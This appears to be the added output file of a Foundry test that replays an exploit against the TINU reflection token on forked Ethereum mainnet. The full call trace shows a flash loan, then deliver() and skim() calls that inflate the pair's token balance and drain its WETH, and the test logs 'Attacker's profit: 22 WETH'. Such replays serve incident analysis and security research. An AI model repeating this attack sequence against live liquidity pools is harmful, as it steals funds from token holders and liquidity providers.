@@ -1,0 +1,194 @@
+Warning: Found unknown `eth_rpc_retries` config for profile `default` defined in foundry.toml.
+No files changed, compilation skipped
+
+Ran 1 test for test/TINU_exp.sol:TomInuExploit
+[PASS] testHack() (gas: 454500)
+Logs:
+  316 TINU in pair before deliver
+  1465 TINU in attack contract before deliver
+  -------------Delivering-------------
+  2050 TINU in pair after deliver
+  0 TINU in attack contract after deliver
+  -------------Skimming---------------
+  323 TINU in pair after skim
+  1733 TINU in attack contract after skim
+  -------------Delivering-------------
+  11191855 TINU in pair after deliver 2
+  0 TINU in attack contract after deliver 2
+  
+ Attacker's profit: 22 WETH
+
+Traces:
+  [488400] TomInuExploit::testHack()
+    ├─ [0] VM::createSelectFork("mainnet", 16489408 [1.648e7])
+    │   └─ ← [Return] 0
+    ├─ [479885] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [104850000000000000000 [1.048e20]], 0x)
+    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
+    │   │   └─ ← [Return] 139039729301264180297254 [1.39e23]
+    │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   ├─ [27962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 104850000000000000000 [1.048e20])
+    │   │   ├─ emit Transfer(from: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 104850000000000000000 [1.048e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x000000000000000000000000000000000000000000000005af16077b1bb50000
+    │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x000000000000000000000000000000000000000000001d715bdc2f7122d1be26 → 0x000000000000000000000000000000000000000000001d6bacc627f6071cbe26
+    │   │   └─ ← [Return] true
+    │   ├─ [426076] TomInuExploit::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [104850000000000000000 [1.048e20]], [0], 0x)
+    │   │   ├─ [24420] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x466c74776b1cb1a6f02cc765a14cd3bfd6607c3d7fcc2476c94e5bc071e25f00: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [24609] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xa148fe3774b01d96c7f9fa0871ef8d1ba8e10a558de225107d95bbe1cefdeca9: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [191414] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForTokensSupportingFeeOnTransferTokens(104850000000000000000 [1.048e20], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F], TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [8225] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb835752Feb00c278484c464b697e03b03C53E11B, 104850000000000000000 [1.048e20])
+    │   │   │   │   ├─ emit Transfer(from: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xb835752Feb00c278484c464b697e03b03C53E11B, amount: 104850000000000000000 [1.048e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x4c5e2f5688e59e4d6cb0926e6375f3e79f2b87e8e534ac0eb1dc60dff7b3ab97: 0x00000000000000000000000000000000000000000000000133514952669a6a70 → 0x000000000000000000000000000000000000000000000006e26750cd824f6a70
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000005af16077b1bb50000 → 0
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [20777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [2504] 0xb835752Feb00c278484c464b697e03b03C53E11B::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000609977d2a0e5a8e68e00000000000000000000000000000000000000000000000133514952669a6a7000000000000000000000000000000000000000000000000000000000610fc0b8
+    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   │   └─ ← [Return] 126994561461014981232 [1.269e20]
+    │   │   │   ├─ [144905] 0xb835752Feb00c278484c464b697e03b03C53E11B::swap(1470449218539614064547 [1.47e21], 0, TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [108274] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::transfer(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1470449218539614064547 [1.47e21])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xb835752Feb00c278484c464b697e03b03C53E11B, to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1352813281056444939385 [1.352e21])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 14: 0x000000000000000000000000000000000000000000000005f6f6444735932f05 → 0x0000000000000000000000000000000000000000000000078f17f7bf77a9e3cf
+    │   │   │   │   │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0 → 0x0000000000000000000000000000000000000000000000000000000063d2277a
+    │   │   │   │   │   │   @ 0x9a60c7871b057268229785bb3a921d851e0f6eb5a67f89ec3690ee14fe8fb68c: 0x02316379cecf95432e3b74e389c8719d6300628b1dbbe17842d27c0ca5711236 → 0x0e1200701170fe5bf5b54a4830f5048abb4ce9eece4b1115fb20fd0b99b44f36
+    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0xc1ff590b95a1b494ddb38e70de015d65561326939d492790cc566defe2308db8
+    │   │   │   │   │   │   @ 0x4c5e2f5688e59e4d6cb0926e6375f3e79f2b87e8e534ac0eb1dc60dff7b3ab97: 0xefe42a93ce1e12e66a09b2defa539ab5e878a1e9998e8159145864cd195bb309 → 0x29ef47e0ccf13b494b800646d52195282fef00f5d770b675f92d3372723d36a1
+    │   │   │   │   │   │   @ 13: 0xf0789cce6735b5fb658c854b68677c5ca5fd1ac1cd67b4dec1faffd781c3f293 → 0xec831326fbaa92f324b667242136d4344386a061a893118c73263c6cbcd603e3
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 316871513264115731249 [3.168e20]
+    │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 126994561461014981232 [1.269e20]
+    │   │   │   │   ├─ emit Sync(reserve0: 316871513264115731249 [3.168e20], reserve1: 126994561461014981232 [1.269e20])
+    │   │   │   │   ├─ emit Swap(sender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount0In: 5374761729091646534 [5.374e18], amount1In: 104850000000000000000 [1.048e20], amount0Out: 1470449218539614064547 [1.47e21], amount1Out: 0, to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 9: 0x0000000000000000000000000000000325caf91ace883c055d4650266a4bd928 → 0x0000000000000000000000000000000bed1b94e9f9da923356329d172c598a66
+    │   │   │   │   │   @ 10: 0x0000000000000000000000000000097fea17a54a5b8633ce1d7ea4629445c68d → 0x0000000000000000000000000000e78b289f1e515718ed7635f6e6d1ca3f5c9e
+    │   │   │   │   │   @ 8: 0x610fc0b800000000000133514952669a6a700000000000609977d2a0e5a8e68e → 0x63d2276b000000000006e26750cd824f6a700000000000112d79c274dc18cb31
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1465904852700232013011 [1.465e21]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   └─ ← [Return] 316871513264115731249 [3.168e20]
+    │   │   ├─ [0] console::log("%s TINU in pair before deliver", 316) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 1465904852700232013011 [1.465e21]
+    │   │   ├─ [0] console::log("%s TINU in attack contract before deliver", 1465) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("-------------Delivering-------------") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 1465904852700232013011 [1.465e21]
+    │   │   ├─ [7383] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::deliver(1465904852700232013011 [1.465e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0xc1ff590b95a1b494ddb38e70de015d65561326939d492790cc566defe2308db8 → 0x0000000000000000025c7080bc90a57523a09a78af38afc5ed04cd9e6a6c1aca
+    │   │   │   │   @ 13: 0xec831326fbaa92f324b667242136d4344386a061a893118c73263c6cbcd603e3 → 0x2a83ba1b6608de5e495f4933ffc61c4411141446ba8299c193d49c1b451190f5
+    │   │   │   │   @ 14: 0x0000000000000000000000000000000000000000000000078f17f7bf77a9e3cf → 0x000000000000000000000000000000000000000000000057069c3094fe4fb8a2
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   └─ ← [Return] 2050642424158542203032 [2.05e21]
+    │   │   ├─ [0] console::log("%s TINU in pair after deliver", 2050) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 6
+    │   │   ├─ [0] console::log("%s TINU in attack contract after deliver", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("-------------Skimming---------------") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [38606] 0xb835752Feb00c278484c464b697e03b03C53E11B::skim(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   │   └─ ← [Return] 2050642424158542203032 [2.05e21]
+    │   │   │   ├─ [23174] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::transfer(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1733770910894426471783 [1.733e21])
+    │   │   │   │   ├─ emit Transfer(from: 0xb835752Feb00c278484c464b697e03b03C53E11B, to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1595069238022872354042 [1.595e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000025c7080bc90a57523a09a78af38afc5ed04cd9e6a6c1aca → 0x22bee7622350894356d8c13ae0f493c0cf573df9479c45c0be592f34d4a648f2
+    │   │   │   │   │   @ 0x9a60c7871b057268229785bb3a921d851e0f6eb5a67f89ec3690ee14fe8fb68c: 0x0e1200701170fe5bf5b54a4830f5048abb4ce9eece4b1115fb20fd0b99b44f36 → 0x10329670da22552162fc51c7e9c92ed60f3df205168cc9d799be492c057135b2
+    │   │   │   │   │   @ 13: 0x2a83ba1b6608de5e495f4933ffc61c4411141446ba8299c193d49c1b451190f5 → 0x29ce32c5cdcdc171cfbd220743f46665c8a19c72ea074bc6ce0d337ea3ed187b
+    │   │   │   │   │   @ 14: 0x000000000000000000000000000000000000000000000057069c3094fe4fb8a2 → 0x000000000000000000000000000000000000000000000058e7d405bba1aa74bd
+    │   │   │   │   │   @ 0x4c5e2f5688e59e4d6cb0926e6375f3e79f2b87e8e534ac0eb1dc60dff7b3ab97: 0x29ef47e0ccf13b494b800646d52195282fef00f5d770b675f92d3372723d36a1 → 0x067ad929116595197d618e5ff4ebf0fe3bc5e5a16e91d2806211693f66de8fff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   │   └─ ← [Return] 126994561461014981232 [1.269e20]
+    │   │   │   ├─ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   ├─ emit Transfer(from: 0xb835752Feb00c278484c464b697e03b03C53E11B, to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   └─ ← [Return] 323338092012961377606 [3.233e20]
+    │   │   ├─ [0] console::log("%s TINU in pair after skim", 323) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 1733769909104888397946 [1.733e21]
+    │   │   ├─ [0] console::log("%s TINU in attack contract after skim", 1733) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("-------------Delivering-------------") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 1733769909104888397946 [1.733e21]
+    │   │   ├─ [7383] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::deliver(1733769909104888397946 [1.733e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x22bee7622350894356d8c13ae0f493c0cf573df9479c45c0be592f34d4a648f2 → 0x00000000000000000057a247924dae38b738b66195abf25721799e6534f4fcfa
+    │   │   │   │   @ 13: 0x29ce32c5cdcdc171cfbd220743f46665c8a19c72ea074bc6ce0d337ea3ed187b → 0x070f4b63aa7d382e793c0313f54d80ddb08314db3816f85d312da2af043bcc83
+    │   │   │   │   @ 14: 0x000000000000000000000000000000000000000000000058e7d405bba1aa74bd → 0x0000000000000000000000000000000000000000000000b6e4b818283bd4b537
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   └─ ← [Return] 11191855315120216048899805 [1.119e25]
+    │   │   ├─ [0] console::log("%s TINU in pair after deliver 2", 11191855 [1.119e7]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 32051 [3.205e4]
+    │   │   ├─ [0] console::log("%s TINU in attack contract after deliver 2", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   └─ ← [Return] 126994561461014981232 [1.269e20]
+    │   │   ├─ [40580] 0xb835752Feb00c278484c464b697e03b03C53E11B::swap(0, 126984561461014981232 [1.269e20], TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [23162] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 126984561461014981232 [1.269e20])
+    │   │   │   │   ├─ emit Transfer(from: 0xb835752Feb00c278484c464b697e03b03C53E11B, to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 126984561461014981232 [1.269e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x000000000000000000000000000000000000000000000006e243c9db128e6a70
+    │   │   │   │   │   @ 0x4c5e2f5688e59e4d6cb0926e6375f3e79f2b87e8e534ac0eb1dc60dff7b3ab97: 0x000000000000000000000000000000000000000000000006e26750cd824f6a70 → 0x000000000000000000000000000000000000000000000000002386f26fc10000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   │   └─ ← [Return] 11191855315120216048899805 [1.119e25]
+    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
+    │   │   │   │   └─ ← [Return] 10000000000000000 [1e16]
+    │   │   │   ├─ emit Sync(reserve0: 11191855315120216048899805 [1.119e25], reserve1: 10000000000000000 [1e16])
+    │   │   │   ├─ emit Swap(sender: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 11191538443606951933168556 [1.119e25], amount1In: 0, amount0Out: 0, amount1Out: 126984561461014981232 [1.269e20], to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x63d2276b000000000006e26750cd824f6a700000000000112d79c274dc18cb31 → 0x63d2276b000000000000002386f26fc100000000000941f7b13d2f05ce7f96dd
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 104850000000000000000 [1.048e20])
+    │   │   │   ├─ emit Transfer(from: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, amount: 104850000000000000000 [1.048e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x000000000000000000000000000000000000000000001d6bacc627f6071cbe26 → 0x000000000000000000000000000000000000000000001d715bdc2f7122d1be26
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000006e243c9db128e6a70 → 0x000000000000000000000000000000000000000000000001332dc25ff6d96a70
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 22134561461014981232 [2.213e19]
+    │   │   ├─ [0] console::log("\n Attacker's profit: %s WETH", 22) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
+    │   │   └─ ← [Return] 139039729301264180297254 [1.39e23]
+    │   ├─ emit FlashLoan(param0: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, param2: 104850000000000000000 [1.048e20], param3: 0)
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 896.52ms (896.35ms CPU time)
+
+Ran 1 test suite in 898.08ms (896.52ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
